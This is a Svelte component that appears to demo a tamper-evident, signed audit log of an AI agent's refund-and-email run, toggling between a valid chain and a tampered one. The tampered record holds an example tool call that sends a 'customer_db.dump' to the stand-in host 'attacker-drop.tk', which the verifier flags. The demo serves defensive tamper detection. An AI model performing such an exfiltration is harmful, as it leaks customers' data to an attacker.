<script lang="ts">
  type Record = {
    step: number;
    kind: string;
    preview: string;
    prev_hash: string;
    content_hash: string;
    signature: string;
    status: 'ok' | 'content_mismatch' | 'broken_link';
    note?: string;
  };

  const VALID_CHAIN: Record[] = [
    {
      step: 0,
      kind: 'agent_start',
      preview: 'user_intent: "refund order #8821 for customer_id=4419"',
      prev_hash: '0000000000000000000000000000000000000000000000000000000000000000',
      content_hash: 'a1f4c8e2b7d3950e4f2c1a8b6d7e3f91c4b2a8e7d3f1c9a2b8e4d7f3c1a9b8e2',
      signature: '7c3d9a1e4b8c2f5d7a3e9b1c4d6f8a2e5b7c9d1f3a5e7b9c1d3f5a7e9b1c3d5f...',
      status: 'ok',
    },
    {
      step: 1,
      kind: 'llm_start',
      preview: 'model: anthropic/claude-sonnet-4-6 | prompt_tokens: 847',
      prev_hash: 'a1f4c8e2b7d3950e4f2c1a8b6d7e3f91c4b2a8e7d3f1c9a2b8e4d7f3c1a9b8e2',
      content_hash: 'b2e5d9f3c8a4061f5d3b2c9a7e8f4a02d5c3b9f8e4a2d0b3c9f5e8a4b2d0c9e3',
      signature: '8d4e0b2f5c9d3a6e8b4f0c2d5e7a9b3f6c8d0e2a4b6d8f0c2e4a6b8d0f2c4e6a...',
      status: 'ok',
    },
    {
      step: 2,
      kind: 'tool_start',
      preview: 'tool: send_email | to: "customer@acme.co" | subject: "Refund processed"',
      prev_hash: 'b2e5d9f3c8a4061f5d3b2c9a7e8f4a02d5c3b9f8e4a2d0b3c9f5e8a4b2d0c9e3',
      content_hash: 'c3f6e0a4d9b5172a6e4c3d0b8f9e5b13e6d4c0a9f5b3e1c4d0a6f9b5c3e1d0a4',
      signature: '9e5f1c3a6d0e4b7f9c5d1e3f6a8b0c2d4e6f8a0c2e4f6b8d0a2c4e6f8b0d2a4c...',
      status: 'ok',
    },
    {
      step: 3,
      kind: 'tool_end',
      preview: 'result: {"status": "delivered", "message_id": "msg_9f3a2c"}',
      prev_hash: 'c3f6e0a4d9b5172a6e4c3d0b8f9e5b13e6d4c0a9f5b3e1c4d0a6f9b5c3e1d0a4',
      content_hash: 'd4a7f1b5e0c6283b7f5d4e1c9a0f6c24f7e5d1b0a6c4f2d5e1b7a0c6d4f2e1b5',
      signature: 'af62d4b7e1f5c8a0d6e2f4b7c9e1d3f5a7c9e1f3b5d7a9c1e3f5b7d9a1c3e5f7...',
      status: 'ok',
    },
    {
      step: 4,
      kind: 'agent_finish',
      preview: 'outcome: success | duration_ms: 1842 | steps_executed: 4',
      prev_hash: 'd4a7f1b5e0c6283b7f5d4e1c9a0f6c24f7e5d1b0a6c4f2d5e1b7a0c6d4f2e1b5',
      content_hash: 'e5b8a2c6f1d7394c8a6e5f2d0b1a7d35a8f6e2c1b7d5e3f6c2a8b1d7e5f3a2c6',
      signature: 'b073e5c8f2a6d9b1e7f3a5c8d0f2a4b6c8e0f2a4d6c8e0b2d4f6a8c0e2b4d6f8...',
      status: 'ok',
    },
  ];

  // Tampered chain: attacker modified record 2's payload (send_email -> exfiltrate_data)
  // but cannot re-sign, so content_hash in the record no longer matches the computed hash,
  // AND record 3's prev_hash no longer points to the correct (new) content_hash.
  const TAMPERED_CHAIN: Record[] = [
    { ...VALID_CHAIN[0] },
    { ...VALID_CHAIN[1] },
    {
      step: 2,
      kind: 'tool_start',
      preview: 'tool: exfiltrate_data | to: "attacker-drop.tk" | payload: "customer_db.dump"',
      prev_hash: 'b2e5d9f3c8a4061f5d3b2c9a7e8f4a02d5c3b9f8e4a2d0b3c9f5e8a4b2d0c9e3',
      content_hash: 'c3f6e0a4d9b5172a6e4c3d0b8f9e5b13e6d4c0a9f5b3e1c4d0a6f9b5c3e1d0a4',
      signature: '9e5f1c3a6d0e4b7f9c5d1e3f6a8b0c2d4e6f8a0c2e4f6b8d0a2c4e6f8b0d2a4c...',
      status: 'content_mismatch',
      note: 'Stored content_hash does not match BLAKE3 of canonicalised payload.',
    },
    {
      ...VALID_CHAIN[3],
      status: 'broken_link',
      note: 'prev_hash no longer verifies: predecessor integrity invalid.',
    },
    {
      ...VALID_CHAIN[4],
      status: 'broken_link',
      note: 'Chain broken upstream at step 2.',
    },
  ];

  let mode = $state<'valid' | 'tampered'>('valid');
  let selectedStep = $state(0);
  let chain = $derived(mode === 'valid' ? VALID_CHAIN : TAMPERED_CHAIN);
  let current = $derived(chain[selectedStep]);

  function setMode(m: 'valid' | 'tampered') {
    mode = m;
    selectedStep = m === 'tampered' ? 2 : 0;
  }
</script>

<div class="glass-panel rounded-lg overflow-hidden">
  <!-- Header: verification status + toggle -->
  <div class="border-b border-white/10 px-4 sm:px-6 py-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3">
    <div class="flex items-center gap-3">
      <span class="font-mono text-[10px] uppercase tracking-[0.18em] text-zinc-500">air trace</span>
      <span class="font-mono text-xs text-zinc-400">my-agent.log</span>
    </div>
    <div class="flex gap-0 font-mono text-[11px] border border-white/15 rounded">
      <button
        type="button"
        class="px-3 py-1.5 transition-colors uppercase tracking-wider {mode === 'valid'
          ? 'bg-green-500/20 text-green-400 border-r border-white/15'
          : 'text-zinc-400 hover:text-white border-r border-white/15'}"
        onclick={() => setMode('valid')}
      >
        Valid chain
      </button>
      <button
        type="button"
        class="px-3 py-1.5 transition-colors uppercase tracking-wider {mode === 'tampered'
          ? 'bg-brand-red/20 text-brand-red'
          : 'text-zinc-400 hover:text-white'}"
        onclick={() => setMode('tampered')}
      >
        Tampered chain
      </button>
    </div>
  </div>

  <!-- Verification verdict line -->
  <div class="px-4 sm:px-6 py-3 border-b border-white/10 font-mono text-xs">
    {#if mode === 'valid'}
      <span class="text-green-400">[verified]</span>
      <span class="text-zinc-400">5 records | signatures valid | chain intact | signer: 7c3d9a1e...</span>
    {:else}
      <span class="text-brand-red">[chain broken at step 2]</span>
      <span class="text-zinc-400">2 of 5 verified | content_hash mismatch at step 2 | downstream invalid</span>
    {/if}
  </div>

  <div class="grid md:grid-cols-[260px_1fr] divide-y md:divide-y-0 md:divide-x divide-white/10">
    <!-- Step list -->
    <div class="p-2">
      <ul class="space-y-1">
        {#each chain as record}
          <li>
            <button
              type="button"
              class="w-full text-left px-3 py-2 rounded font-mono text-xs flex items-center gap-2 transition-colors {selectedStep ===
              record.step
                ? 'bg-white/10 text-white'
                : 'text-zinc-400 hover:bg-white/5 hover:text-white'}"
              onclick={() => (selectedStep = record.step)}
            >
              {#if record.status === 'ok'}
                <span class="text-green-400" aria-hidden="true">✓</span>
              {:else if record.status === 'content_mismatch'}
                <span class="text-brand-red animate-pulse-glow" aria-hidden="true">✗</span>
              {:else}
                <span class="text-zinc-600" aria-hidden="true">◌</span>
              {/if}
              <span class="text-zinc-500">step {record.step}</span>
              <span class="flex-1 truncate">{record.kind}</span>
            </button>
          </li>
        {/each}
      </ul>
    </div>

    <!-- Record detail -->
    <div class="p-4 sm:p-6">
      <div class="flex items-center gap-3 mb-4">
        <span class="font-mono text-[10px] uppercase tracking-[0.18em] text-zinc-500">record</span>
        <span class="font-mono text-sm text-white">{current.kind}</span>
        <span class="font-mono text-xs text-zinc-500">step {current.step}</span>
        {#if current.status === 'ok'}
          <span class="ml-auto font-mono text-[10px] uppercase tracking-wider px-2 py-0.5 bg-green-500/10 text-green-400 border border-green-500/20 rounded">
            verified
          </span>
        {:else if current.status === 'content_mismatch'}
          <span class="ml-auto font-mono text-[10px] uppercase tracking-wider px-2 py-0.5 bg-brand-red/15 text-brand-red border border-brand-red/30 rounded">
            content mismatch
          </span>
        {:else}
          <span class="ml-auto font-mono text-[10px] uppercase tracking-wider px-2 py-0.5 bg-zinc-500/10 text-zinc-400 border border-zinc-500/20 rounded">
            unverifiable
          </span>
        {/if}
      </div>

      <!-- Payload preview -->
      <div class="mb-4">
        <div class="font-mono text-[10px] uppercase tracking-[0.18em] text-zinc-500 mb-1">
          payload
        </div>
        <div
          class="code-block text-xs {mode === 'tampered' && current.step === 2
            ? 'border-brand-red/40 bg-brand-red/5'
            : ''}"
        >
          <span class="text-zinc-300">{current.preview}</span>
          {#if mode === 'tampered' && current.step === 2}
            <div class="mt-2 text-[11px] text-brand-red">
              // altered by attacker after signing (send_email → exfiltrate_data)
            </div>
          {/if}
        </div>
      </div>

      <!-- Integrity fields -->
      <dl class="space-y-3 text-xs font-mono">
        <div>
          <dt class="text-zinc-500 mb-0.5 flex items-center gap-2">
            <span>prev_hash</span>
            <span
              class="text-[9px] uppercase tracking-wider text-zinc-600 border border-white/10 rounded px-1"
            >
              link to previous
            </span>
          </dt>
          <dd
            class="text-zinc-300 break-all {mode === 'tampered' && current.status === 'broken_link'
              ? 'text-brand-red'
              : ''}"
          >
            {current.prev_hash}
          </dd>
        </div>
        <div>
          <dt class="text-zinc-500 mb-0.5 flex items-center gap-2">
            <span>content_hash</span>
            <span
              class="text-[9px] uppercase tracking-wider text-zinc-600 border border-white/10 rounded px-1"
            >
              BLAKE3 of canonical payload
            </span>
          </dt>
          <dd
            class="text-zinc-300 break-all {mode === 'tampered' &&
            current.status === 'content_mismatch'
              ? 'text-brand-red'
              : ''}"
          >
            {current.content_hash}
          </dd>
        </div>
        <div>
          <dt class="text-zinc-500 mb-0.5 flex items-center gap-2">
            <span>signature</span>
            <span
              class="text-[9px] uppercase tracking-wider text-zinc-600 border border-white/10 rounded px-1"
            >
              Ed25519(prev_hash || content_hash)
            </span>
          </dt>
          <dd class="text-zinc-300 break-all">{current.signature}</dd>
        </div>
      </dl>

      {#if current.note}
        <div
          class="mt-4 border-l-2 border-brand-red pl-3 py-1 bg-brand-red/5 text-xs text-brand-red font-mono"
        >
          {current.note}
        </div>
      {/if}
    </div>
  </div>

  <!-- Footer: verification command -->
  <div
    class="border-t border-white/10 px-4 sm:px-6 py-3 bg-black/30 font-mono text-[11px] text-zinc-500 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-2"
  >
    <span>$ air trace my-agent.log --verify --public-key 7c3d9a1e...</span>
    {#if mode === 'valid'}
      <span class="text-green-400">exit 0</span>
    {:else}
      <span class="text-brand-red">exit 1 (chain broken)</span>
    {/if}
  </div>
</div>
